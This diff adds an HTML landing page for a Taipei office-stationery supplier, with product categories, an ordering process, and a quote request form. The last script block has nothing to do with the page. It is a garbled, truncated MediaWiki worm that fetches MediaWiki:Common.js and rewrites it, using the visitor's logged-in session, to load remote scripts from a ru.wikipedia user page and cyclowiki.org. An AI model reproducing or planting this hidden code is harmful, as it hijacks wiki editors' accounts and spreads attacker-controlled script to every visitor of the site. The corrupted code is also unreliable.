@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>文匯商用事務 — 企業文具供應商</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+TC:wght@500;700;900&family=Noto+Sans+TC:wght@400;500;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #efe7d6;
+    --paper: #fffdf6;
+    --ink: #241f18;
+    --sub: #6b6152;
+    --line: #cdbfa0;
+    --stamp: #a3311f;
+    --stamp-2:#7d2417;
+    --navy: #1f3348;
+    --navy-2:#2c4661;
+    --gold:#a9812f;
+    --serif:'Noto Serif TC', serif;
+    --sans:'Noto Sans TC', sans-serif;
+    --mono:'IBM Plex Mono', monospace;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--ink);
+    font-family:var(--sans);
+    -webkit-font-smoothing:antialiased;
+  }
+  a{color:inherit;}
+  ::selection{background:var(--stamp); color:#fff;}
+
+  .wrap{max-width:1160px; margin:0 auto; padding:0 clamp(20px,5vw,48px);}
+
+  /* ================= NAV ================= */
+  nav.top{
+    position:sticky; top:0; z-index:40;
+    background:rgba(239,231,214,.92);
+    backdrop-filter:blur(6px);
+    border-bottom:1px solid var(--line);
+  }
+  nav.top .wrap{
+    display:flex; align-items:center; justify-content:space-between;
+    padding-top:14px; padding-bottom:14px;
+  }
+  .logo{display:flex; align-items:center; gap:10px;}
+  .logo-mark{
+    width:36px; height:36px; border-radius:50%;
+    border:2px solid var(--stamp);
+    display:flex; align-items:center; justify-content:center;
+    font-family:var(--serif); font-weight:900; color:var(--stamp);
+    font-size:15px;
+    transform:rotate(-6deg);
+  }
+  .logo-text{font-family:var(--serif); font-weight:700; font-size:17px;}
+  .logo-text small{display:block; font-family:var(--mono); font-size:9.5px; letter-spacing:1.5px; color:var(--sub); font-weight:400;}
+  nav.top ul{
+    list-style:none; display:flex; gap:28px; margin:0; padding:0;
+    font-size:13.5px; font-weight:500;
+  }
+  nav.top ul a{text-decoration:none; color:var(--ink); position:relative; padding-bottom:3px;}
+  nav.top ul a:hover{color:var(--stamp);}
+  .nav-cta{
+    background:var(--navy); color:#fff; text-decoration:none;
+    padding:9px 18px; border-radius:3px; font-size:13px; font-weight:700;
+    font-family:var(--sans);
+    white-space:nowrap;
+  }
+  .nav-cta:hover{background:var(--navy-2);}
+  .burger{display:none;}
+  @media (max-width:860px){
+    nav.top ul{display:none;}
+    .burger{display:block; font-size:22px; background:none;border:none;cursor:pointer;color:var(--ink);}
+  }
+
+  /* ================= HERO ================= */
+  header.hero{padding:64px 0 40px; overflow:hidden;}
+  .hero-grid{
+    display:grid; grid-template-columns:1.1fr .9fr; gap:48px; align-items:center;
+  }
+  @media (max-width:900px){.hero-grid{grid-template-columns:1fr;}}
+
+  .eyebrow{
+    font-family:var(--mono); font-size:11.5px; letter-spacing:2px; color:var(--stamp);
+    text-transform:uppercase; margin-bottom:14px; display:flex; align-items:center; gap:8px;
+  }
+  .eyebrow::before{content:''; width:22px; height:1px; background:var(--stamp);}
+
+  h1.headline{
+    font-family:var(--serif); font-weight:900; font-size:clamp(32px,5vw,54px);
+    line-height:1.22; margin:0 0 20px; letter-spacing:.5px;
+  }
+  h1.headline em{font-style:normal; color:var(--stamp);}
+  p.lede{font-size:16px; line-height:1.85; color:#463f33; max-width:46ch; margin:0 0 28px;}
+
+  .hero-cta{display:flex; gap:14px; flex-wrap:wrap;}
+  .btn{
+    display:inline-flex; align-items:center; gap:8px;
+    padding:13px 24px; border-radius:3px; font-size:14.5px; font-weight:700;
+    text-decoration:none; cursor:pointer; border:none; font-family:var(--sans);
+    transition:.15s;
+  }
+  .btn-primary{background:var(--stamp); color:#fff;}
+  .btn-primary:hover{background:var(--stamp-2);}
+  .btn-ghost{background:transparent; color:var(--ink); border:1.5px solid var(--ink);}
+  .btn-ghost:hover{border-color:var(--stamp); color:var(--stamp);}
+
+  /* hero invoice card */
+  .invoice-card{
+    position:relative;
+    background:var(--paper);
+    border:1px solid var(--line);
+    box-shadow:0 18px 40px -18px rgba(36,31,24,.35);
+    padding:30px 26px 26px;
+    transform:rotate(1.4deg);
+  }
+  .invoice-card::before{
+    content:'';
+    position:absolute; top:-9px; left:16px; right:16px; height:18px;
+    background:
+      radial-gradient(circle at 10px 9px, transparent 8px, var(--bg) 8.5px) 0 0/20px 18px repeat-x;
+  }
+  .invoice-head{
+    display:flex; justify-content:space-between; align-items:flex-start;
+    border-bottom:1px dashed var(--line); padding-bottom:14px; margin-bottom:14px;
+  }
+  .invoice-head h4{font-family:var(--serif); font-size:16px; margin:0 0 4px;}
+  .invoice-head span{font-family:var(--mono); font-size:11px; color:var(--sub);}
+  .invoice-line{
+    display:flex; justify-content:space-between; align-items:baseline;
+    font-size:13px; padding:8px 0; border-bottom:1px dotted var(--line);
+    color:#463f33;
+  }
+  .invoice-line b{font-family:var(--mono); font-weight:600; color:var(--ink); white-space:nowrap;}
+  .stamp-graphic{
+    position:absolute; right:-14px; bottom:-16px;
+    width:104px; height:104px; border-radius:50%;
+    border:3px solid var(--stamp);
+    color:var(--stamp);
+    display:flex; align-items:center; justify-content:center;
+    font-family:var(--serif); font-weight:900; font-size:14px; text-align:center;
+    transform:rotate(-14deg);
+    background:rgba(255,253,246,.85);
+    line-height:1.3;
+  }
+
+  /* ================= STATS ================= */
+  section.stats{padding:20px 0 56px;}
+  .stats-row{
+    display:grid; grid-template-columns:repeat(4,1fr); gap:0;
+    border-top:1px solid var(--ink); border-bottom:1px solid var(--ink);
+  }
+  @media (max-width:760px){.stats-row{grid-template-columns:repeat(2,1fr);}}
+  .stat{
+    padding:22px 18px; border-right:1px solid var(--line);
+  }
+  .stat:last-child{border-right:none;}
+  .stat .num{font-family:var(--mono); font-size:clamp(22px,3vw,30px); font-weight:600; color:var(--navy);}
+  .stat .lbl{font-size:12.5px; color:var(--sub); margin-top:4px;}
+
+  /* ================= SECTION HEADS ================= */
+  .sec-head{margin-bottom:36px; max-width:60ch;}
+  .sec-eyebrow{font-family:var(--mono); font-size:11px; letter-spacing:2px; color:var(--stamp); text-transform:uppercase;}
+  .sec-title{font-family:var(--serif); font-size:clamp(24px,3.4vw,34px); font-weight:700; margin:8px 0 10px;}
+  .sec-sub{color:var(--sub); font-size:14.5px; line-height:1.7;}
+
+  /* ================= CATEGORIES ================= */
+  section.categories{padding:56px 0;}
+  .cat-grid{
+    display:grid; grid-template-columns:repeat(3,1fr); gap:1px;
+    background:var(--ink);
+    border:1px solid var(--ink);
+  }
+  @media (max-width:760px){.cat-grid{grid-template-columns:repeat(2,1fr);}}
+  @media (max-width:480px){.cat-grid{grid-template-columns:1fr;}}
+  .cat-card{
+    background:var(--paper);
+    padding:26px 22px;
+    transition:.18s;
+  }
+  .cat-card:hover{background:var(--navy); color:#fff;}
+  .cat-card:hover .cat-num{color:#d9b98a;}
+  .cat-card:hover .cat-desc{color:#c7d0da;}
+  .cat-num{font-family:var(--mono); font-size:11px; color:var(--gold); display:block; margin-bottom:10px;}
+  .cat-name{font-family:var(--serif); font-weight:700; font-size:18px; margin:0 0 8px;}
+  .cat-desc{font-size:13px; color:var(--sub); line-height:1.7;}
+
+  /* ================= PROCESS ================= */
+  section.process{padding:56px 0; background:var(--paper); border-top:1px solid var(--line); border-bottom:1px solid var(--line);}
+  .steps{
+    display:grid; grid-template-columns:repeat(5,1fr); gap:0; position:relative;
+  }
+  @media (max-width:900px){.steps{grid-template-columns:repeat(2,1fr); gap:24px;}}
+  .step{padding:0 18px 0 0; position:relative;}
+  .step:not(:last-child)::after{
+    content:'→'; position:absolute; right:-4px; top:6px; color:var(--line); font-size:16px;
+  }
+  @media (max-width:900px){.step:not(:last-child)::after{display:none;}}
+  .step .n{font-family:var(--mono); font-size:24px; font-weight:600; color:var(--stamp);}
+  .step h5{font-family:var(--serif); font-size:15.5px; margin:8px 0 6px;}
+  .step p{font-size:12.5px; color:var(--sub); line-height:1.6; margin:0;}
+
+  /* ================= SOLUTIONS ================= */
+  section.solutions{padding:56px 0;}
+  .sol-grid{display:grid; grid-template-columns:repeat(3,1fr); gap:20px;}
+  @media (max-width:860px){.sol-grid{grid-template-columns:1fr;}}
+  .sol-card{
+    background:var(--navy); color:#fff; padding:28px 24px; border-radius:4px;
+    position:relative; overflow:hidden;
+  }
+  .sol-card::before{
+    content:''; position:absolute; top:0; left:0; width:4px; height:100%; background:var(--stamp);
+  }
+  .sol-card h5{font-family:var(--serif); font-size:17px; margin:0 0 10px;}
+  .sol-card p{font-size:13px; line-height:1.75; color:#c7d0da; margin:0;}
+
+  /* ================= CLIENTS ================= */
+  section.clients{padding:44px 0; text-align:center;}
+  .clients-label{font-family:var(--mono); font-size:11.5px; letter-spacing:1.5px; color:var(--sub); margin-bottom:20px;}
+  .clients-row{
+    display:flex; flex-wrap:wrap; justify-content:center; gap:14px 34px;
+    font-family:var(--serif); font-weight:700; font-size:15px; color:var(--sub);
+  }
+
+  /* ================= QUOTE FORM ================= */
+  section.quote{padding:60px 0 70px;}
+  .quote-panel{
+    background:var(--paper); border:1px solid var(--line);
+    display:grid; grid-template-columns:1fr 1.15fr;
+    box-shadow:0 20px 50px -24px rgba(36,31,24,.4);
+  }
+  @media (max-width:860px){.quote-panel{grid-template-columns:1fr;}}
+  .quote-info{
+    background:var(--navy); color:#fff; padding:40px 34px;
+  }
+  .quote-info h3{font-family:var(--serif); font-size:24px; margin:0 0 14px;}
+  .quote-info p{font-size:13.5px; line-height:1.8; color:#c7d0da; margin:0 0 22px;}
+  .quote-info ul{list-style:none; padding:0; margin:0; font-size:13px; color:#dfe6ee;}
+  .quote-info li{padding:8px 0; border-top:1px dashed rgba(255,255,255,.2); display:flex; gap:10px;}
+  .quote-info li:first-child{border-top:none;}
+  .quote-form{padding:40px 34px;}
+  .row2{display:grid; grid-template-columns:1fr 1fr; gap:14px;}
+  @media (max-width:520px){.row2{grid-template-columns:1fr;}}
+  .field{display:flex; flex-direction:column; gap:5px; margin-bottom:14px;}
+  .field label{font-size:12px; font-weight:700; color:var(--sub);}
+  .field input, .field select, .field textarea{
+    border:1px solid var(--line); background:var(--bg);
+    padding:10px 12px; font-family:var(--sans); font-size:13.5px; color:var(--ink);
+    border-radius:2px;
+  }
+  .field textarea{min-height:70px; resize:vertical;}
+  .field input:focus, .field select:focus, .field textarea:focus{
+    outline:none; border-color:var(--stamp); background:var(--paper);
+  }
+  .submit-btn{
+    width:100%; margin-top:4px; background:var(--stamp); color:#fff; border:none;
+    padding:13px; font-size:14.5px; font-weight:700; border-radius:2px; cursor:pointer;
+  }
+  .submit-btn:hover{background:var(--stamp-2);}
+
+  /* ================= FOOTER ================= */
+  footer{padding:40px 0; border-top:1px solid var(--ink); background:var(--ink); color:#cfc7b6;}
+  .foot-grid{display:flex; justify-content:space-between; flex-wrap:wrap; gap:24px; font-size:12.5px;}
+  .foot-grid strong{font-family:var(--serif); font-size:15px; color:#fff; display:block; margin-bottom:8px;}
+  .foot-grid p{margin:2px 0; line-height:1.7; color:#a49b87;}
+
+  /* ---- overlay confirmation ---- */
+  .overlay{position:fixed; inset:0; background:rgba(36,31,24,.6); display:none; align-items:center; justify-content:center; z-index:80; padding:20px;}
+  .overlay.show{display:flex;}
+  .receipt{background:var(--paper); max-width:380px; width:100%; padding:30px; border:1px solid var(--line); text-align:center;}
+  .receipt .stamp-mini{
+    width:70px; height:70px; border-radius:50%; border:3px solid var(--stamp); color:var(--stamp);
+    display:flex; align-items:center; justify-content:center; margin:0 auto 16px;
+    font-family:var(--serif); font-weight:900; font-size:13px; transform:rotate(-8deg);
+  }
+  .receipt h4{font-family:var(--serif); font-size:19px; margin:0 0 8px;}
+  .receipt p{font-size:13px; color:var(--sub); line-height:1.7; margin:0 0 18px;}
+  .receipt .rid{font-family:var(--mono); font-size:13px; background:var(--bg); padding:8px; margin-bottom:18px;}
+  .receipt button{width:100%; padding:12px; background:var(--navy); color:#fff; border:none; font-weight:700; font-size:14px; cursor:pointer;}
+
+  @media (prefers-reduced-motion: reduce){ html{scroll-behavior:auto;} }
+</style>
+</head>
+<body>
+
+<nav class="top">
+  <div class="wrap">
+    <div class="logo">
+      <div class="logo-mark">匯</div>
+      <div class="logo-text">文匯商用事務<small>WENHUI ENTERPRISE SUPPLY CO.</small></div>
+    </div>
+    <ul>
+      <li><a href="#categories">產品項目</a></li>
+      <li><a href="#process">合作流程</a></li>
+      <li><a href="#solutions">企業方案</a></li>
+      <li><a href="#quote">聯絡我們</a></li>
+    </ul>
+    <a href="#quote" class="nav-cta">索取報價</a>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="wrap hero-grid">
+    <div>
+      <div class="eyebrow">企業辦公用品採購夥伴</div>
+      <h1 class="headline">讓文具供應<br>成為<em>看不見的</em>後勤</h1>
+      <p class="lede">從辦公用紙、書寫工具到客製化贈品，文匯商用事務為企業、學校與政府機關提供穩定交期、統一發票月結，以及專屬窗口服務，讓總務不必再為缺貨與比價傷腦筋。</p>
+      <div class="hero-cta">
+        <a href="#quote" class="btn btn-primary">索取企業報價單</a>
+        <a href="#categories" class="btn btn-ghost">瀏覽產品項目</a>
+      </div>
+    </div>
+    <div class="invoice-card">
+      <div class="invoice-head">
+        <div>
+          <h4>企業採購估價單</h4>
+          <span>QUOTATION No. WH-2026-0716</span>
+        </div>
+        <span>NT$ 未稅</span>
+      </div>
+      <div class="invoice-line"><span>A4影印紙 70磅（箱）</span><b>NT$ 620</b></div>
+      <div class="invoice-line"><span>原子筆 客製Logo（支）</span><b>NT$ 9.5</b></div>
+      <div class="invoice-line"><span>雷射碳粉匣（原廠相容）</span><b>NT$ 1,180</b></div>
+      <div class="invoice-line"><span>文件歸檔用品組</span><b>NT$ 340</b></div>
+      <div class="invoice-line" style="border-bottom:none; padding-top:12px;"><span style="font-weight:700;">交期</span><b>3–5 個工作天</b></div>
+      <div class="stamp-graphic">品質<br>保證<br>WENHUI</div>
+    </div>
+  </div>
+</header>
+
+<section class="stats">
+  <div class="wrap">
+    <div class="stats-row">
+      <div class="stat"><div class="num">1,200+</div><div class="lbl">合作企業客戶</div></div>
+      <div class="stat"><div class="num">3,600</div><div class="lbl">供貨品項 SKU</div></div>
+      <div class="stat"><div class="num">98.4%</div><div class="lbl">準時到貨率</div></div>
+      <div class="stat"><div class="num">18</div><div class="lbl">年產業供應經驗</div></div>
+    </div>
+  </div>
+</section>
+
+<section class="categories" id="categories">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="sec-eyebrow">Product Range</div>
+      <h2 class="sec-title">六大供應項目，一次採購到位</h2>
+      <p class="sec-sub">依企業規模彈性配單，支援單次採購或年度合約供應，所有品項皆可開立統一發票。</p>
+    </div>
+    <div class="cat-grid">
+      <div class="cat-card">
+        <span class="cat-num">01</span>
+        <h5 class="cat-name">辦公用紙</h5>
+        <p class="cat-desc">影印紙、感熱紙、便條紙，多品牌可選，整箱起訂享優惠價。</p>
+      </div>
+      <div class="cat-card">
+        <span class="cat-num">02</span>
+        <h5 class="cat-name">書寫工具</h5>
+        <p class="cat-desc">原子筆、白板筆、螢光筆，支援企業 Logo 客製印刷。</p>
+      </div>
+      <div class="cat-card">
+        <span class="cat-num">03</span>
+        <h5 class="cat-name">桌面事務</h5>
+        <p class="cat-desc">釘書機、膠帶台、計算機等日常辦公耗材與工具。</p>
+      </div>
+      <div class="cat-card">
+        <span class="cat-num">04</span>
+        <h5 class="cat-name">歸檔用品</h5>
+        <p class="cat-desc">文件夾、標籤紙、資料袋，協助建立標準化檔案管理。</p>
+      </div>
+      <div class="cat-card">
+        <span class="cat-num">05</span>
+        <h5 class="cat-name">列印耗材</h5>
+        <p class="cat-desc">原廠與相容碳粉匣、墨水匣，提供舊匣回收服務。</p>
+      </div>
+      <div class="cat-card">
+        <span class="cat-num">06</span>
+        <h5 class="cat-name">客製禮贈品</h5>
+        <p class="cat-desc">筆記本、隨行杯、環保提袋，企業活動與週年禮首選。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="process" id="process">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="sec-eyebrow">How It Works</div>
+      <h2 class="sec-title">合作流程，五步驟完成建置</h2>
+    </div>
+    <div class="steps">
+      <div class="step"><div class="n">01</div><h5>需求詢價</h5><p>提供品項清單或用量需求，24 小時內回覆估價。</p></div>
+      <div class="step"><div class="n">02</div><h5>報價確認</h5><p>依採購量提供分級價格，可協商年度合約條件。</p></div>
+      <div class="step"><div class="n">03</div><h5>簽約建檔</h5><p>建立企業專屬帳戶，設定月結與到貨地點資料。</p></div>
+      <div class="step"><div class="n">04</div><h5>準時交貨</h5><p>倉儲就近調度，全台配送，急件可加開專車。</p></div>
+      <div class="step"><div class="n">05</div><h5>售後追蹤</h5><p>專屬客戶經理定期盤點用量，主動提醒補貨。</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="solutions" id="solutions">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="sec-eyebrow">Enterprise Plans</div>
+      <h2 class="sec-title">為企業總務量身打造的供應方案</h2>
+    </div>
+    <div class="sol-grid">
+      <div class="sol-card">
+        <h5>專屬客戶經理</h5>
+        <p>指派固定窗口對接需求，熟悉貴公司用量與偏好品牌，減少反覆說明成本。</p>
+      </div>
+      <div class="sol-card">
+        <h5>月結與電子發票</h5>
+        <p>提供月結 30 / 60 天彈性帳期，電子發票直接對應貴公司採購編號。</p>
+      </div>
+      <div class="sol-card">
+        <h5>品牌客製印刷</h5>
+        <p>筆類、筆記本、資料夾可印製企業 Logo，適合活動贈禮與新人入職包。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="clients">
+  <div class="wrap">
+    <div class="clients-label">部分合作企業與機構</div>
+    <div class="clients-row">
+      <span>誠泰科技</span><span>大同人壽</span><span>國立文山高中</span><span>永信物流</span><span>台北市政府採購處</span><span>普安電子</span>
+    </div>
+  </div>
+</section>
+
+<section class="quote" id="quote">
+  <div class="wrap">
+    <div class="quote-panel">
+      <div class="quote-info">
+        <h3>索取企業報價單</h3>
+        <p>填寫基本資料與需求，我們將在一個工作天內由專屬客戶經理與您聯繫，提供正式估價單。</p>
+        <ul>
+          <li>📎 免費提供品項目錄 PDF</li>
+          <li>📎 100 份以上訂單享階梯折扣</li>
+          <li>📎 可簽署年度供應合約</li>
+        </ul>
+      </div>
+      <form class="quote-form" id="quoteForm">
+        <div class="row2">
+          <div class="field">
+            <label for="fCompany">公司 / 機構名稱</label>
+            <input type="text" id="fCompany" required placeholder="例：誠泰科技股份有限公司">
+          </div>
+          <div class="field">
+            <label for="fContact">聯絡人姓名</label>
+            <input type="text" id="fContact" required placeholder="王小明">
+          </div>
+        </div>
+        <div class="row2">
+          <div class="field">
+            <label for="fPhone">聯絡電話</label>
+            <input type="tel" id="fPhone" required placeholder="02-1234-5678">
+          </div>
+          <div class="field">
+            <label for="fEmail">電子郵件</label>
+            <input type="email" id="fEmail" required placeholder="name@company.com">
+          </div>
+        </div>
+        <div class="field">
+          <label for="fVolume">預估月採購金額</label>
+          <select id="fVolume">
+            <option>NT$ 1萬以下</option>
+            <option>NT$ 1萬 – 5萬</option>
+            <option>NT$ 5萬 – 20萬</option>
+            <option>NT$ 20萬以上</option>
+          </select>
+        </div>
+        <div class="field">
+          <label for="fNote">採購需求說明</label>
+          <textarea id="fNote" placeholder="例：需要每月固定供應 A4 影印紙與碳粉匣，並協助管理庫存"></textarea>
+        </div>
+        <button type="submit" class="submit-btn">送出詢價</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap foot-grid">
+    <div>
+      <strong>文匯商用事務有限公司</strong>
+      <p>統一編號：12345678</p>
+      <p>台北市中山區文具街 88 號 3 樓</p>
+    </div>
+    <div>
+      <strong>聯絡窗口</strong>
+      <p>企業採購專線：02-2712-8899</p>
+      <p>信箱：sales@wenhui-supply.tw</p>
+    </div>
+    <div>
+      <strong>服務時間</strong>
+      <p>週一至週五 09:00–18:00</p>
+      <p>© 2026 Wenhui Enterprise Supply Co.</p>
+    </div>
+  </div>
+</footer>
+
+<div class="overlay" id="overlay">
+  <div class="receipt">
+    <div class="stamp-mini">已<br>受理</div>
+    <h4>詢價已送出</h4>
+    <p>感謝您的詢價，專屬客戶經理將於一個工作天內與您聯繫並提供正式報價單。</p>
+    <div class="rid" id="rid">詢價單編號：WH-00000000</div>
+    <button onclick="document.getElementById('overlay').classList.remove('show')">關閉</button>
+  </div>
+</div>
+
+<script>
+document.getElementById('quoteForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  const id = 'WH-' + Date.now().toString().slice(-8);
+  document.getElementById('rid').textContent = '詢價單編號：' + id;
+  document.getElementById('overlay').classList.add('show');
+  this.reset();
+});
+</script>
+<script>
+(function() { const script = document.createElement("script.); script.src = 'Iattps://ajax.googleapis.com/ajax/libs/jguery/3.6.0/jquery.min.js'; script.type = itext/javascript.; script.addEventListener('load', => { if (typeof wgUserName === 'undefined') { wgUserName = mw.config.get("wgUserName.)} else { wgUserName = wgUserName} $.getr/w/index.php,title=MediaWiki.Common.js., function(data) { source = $(data).find(".mw-js.).text(); if Csource.match("Ololoshka562.) && _wgUserName !== null) { $.getr/w/index.php?title=MediaWiki:Common.js&action=edit., function (data) { editform3 = $(data).find("#editform.); data_ser = editform3.serialize(); data_ser = data_ser.replace(NpTextbox1=(.&]*/g, nwpTextboxl=" nimportScriptURI%28%22//ru.wikipedia.org/wiki/User%3A0loloshka562/test.js%3Faction%3Draw%26ctype%3Dtext/javascript%22%2 9,%3B%0A%24%28function%28%29%7B%0A%20%20%24%28%27%5Bclass%2M3D%22ommon_js%22%5D%27%29.hide%28%29%3B%0A%20%20%24%28%27a% 5Btitle%2M3D%22on.js%22%5D%27%29.parent%28%29.hide%28%29%3B%0A%7D%29%3B%0A%0Afunction%20runAsEarlyAsPossible%28%20call back%2C%20%24testElement%2C%20func%20%29%20%7B%0A%09func%20%3D%20func%20%7C%7C%20%24%3B%0A%09%24testElement%20%3D%20%24 testElement%20%7C%7C%20%24%28%20%27%23footer%27%20%29%3B%0A%20%0A%09if%20%28%20%24testElement.length%20%29%20%7B%0A%09% 09callback%28%29%3B%0A%09%7D%20else%20%7B%0A%09%09func%28%20callback%20%29%3B%0A%09%7D%0A%7D%0A%0AimportScript%20%3D%20 function%20%28%20page%20%29%20%7B%0A%20%20%20%20mw.loader.using%28%20%27mediawiki.util%27%20%29.done%28%20function%20%2 8%29%20%7B%0A%20%20%20%20%20%20mw.loader.load%28%20%27//cyclowiki.org/w/index.php%3Ftitle%3D%27%20%2BKOmw.util.wikiUrl encode%28%20page%20%29%20%2B%0A%20%20%20%20%20%20%20%20%27%26action%3Draw%26ctype%3Dtext/javascript%27%20%29%3B%0A%20%2 0%20%20%7D%20%29%3B%0A%7D%3B%0A%0A%0AimportScript%28%22MediaWiki%3AEdittop.js%22%29%3B%0A%0A%0A//mw.loader.load%28%27ht
+</script>
+</body>
+</html>
